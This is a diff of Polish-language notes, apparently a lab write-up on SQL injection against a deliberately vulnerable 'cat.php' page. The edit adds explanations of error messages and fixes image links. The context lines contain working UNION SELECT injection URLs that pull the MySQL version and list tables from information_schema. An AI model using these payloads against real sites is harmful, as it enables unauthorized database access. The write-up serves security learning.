@@ -24,9 +24,9 @@ http://vulnerable/cat.php?id=1%20dowolny%20string
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'dowolny string' at line 1
 ```
 
-wiemy ze jest mysql
+Błąd SQL przy dodaniu dowolnego stringu po id pokazuje, że parametr jest wstrzykiwany bez właściwej sanitizacji — aplikacja buduje zapytanie SQL łącząc stringi bez cytowania/ekscapowania.
 
-w mysql zeby sprawdzic wersje @@version
+Wiemy ze jest mysql
 
 ```
 http://vulnerable/cat.php?id=1%20union%20select%201,%20@@version,%203,%204
@@ -38,13 +38,17 @@ dostajemy
 5.1.63-0+squeeze1
 ```
 
+Wyciągnięcie wartości @@version potwierdza MySQL i wersję 5.1.63-0+squeeze1 (ograniczenia i dostępne funkcje zgodne z MySQL 5.1).
+
 ## undefined index
 
 ```
 http://vulnerable/cat.php?dowolny%20string%20id=1
 ```
 
-[undefined index](\img\cat_undefined.png)
+![undefined index](../img/cat_undefined.png)
+
+"undefined index" po zmianie query string wskazuje, że aplikacja odczytuje konkretne klucze z tablicy GET i nie obsługuje nieoczekiwanych parametrów — to dodatkowy symptom niezwalidowanego wejścia.
 
 ## database
 
@@ -52,7 +56,7 @@ http://vulnerable/cat.php?dowolny%20string%20id=1
 http://vulnerable/cat.php?id=1%20union%20select%201,%20table_name,%203,%204%20from%20information_schema.tables
 ```
 
-[tabele](\img\tables.png)
+![tabele](../img/tables.png)
 
 ```
 CHARACTER_SETS
